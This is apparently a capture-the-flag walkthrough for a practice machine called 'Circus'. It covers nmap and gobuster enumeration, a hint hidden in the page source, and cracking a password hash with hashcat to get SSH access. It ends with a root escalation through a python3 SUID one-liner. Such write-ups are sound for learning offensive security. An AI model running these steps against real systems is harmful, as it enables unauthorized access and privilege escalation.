# Mihir's Circus Writeup


1. Use nmap to enumerate the machine `sudo nmap -sS -A <ip>`
2. Port 80 has a web server running, so navigate to it on a web browser
3. Check the source code of the page and find `<!-- Base64: SGludDogbSBpIGggaSBy -->`. Decode this to get `Hint: m i h i r`
4. Run gobuster with `gobuster dir -w <wordlist> -u <url>` and we find a hidden directory `/m`
5. Using the hint, navigate to `/m/i/h/i/r` to find an image and a `secret.html`
6. Navigate to `secret.html` and view the source code to find a hash that can be cracked with hashcat
7. Copy the hash `$6$67TT6KPw$M/83lanEiFhRu8NnOHk9h08lm42RqG9ZsRri.b2TBVWK6jSNN25S4PmRYhSphq7vktSAIkLyeALaJzAhj0iM4/` into a file `hash` and run hashcat with `hashcat -a 0 -m 1800 hash <path to rockyou wordlist>` to find `joker`
8. Ssh into the machine with `ssh noob@<ip address>` and use `joker` to authenticate
9. Find files with SUID bit set with `find / -perm /4000 2> /dev/null`
10. `python3` is the program that can be exploited to get root with `python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
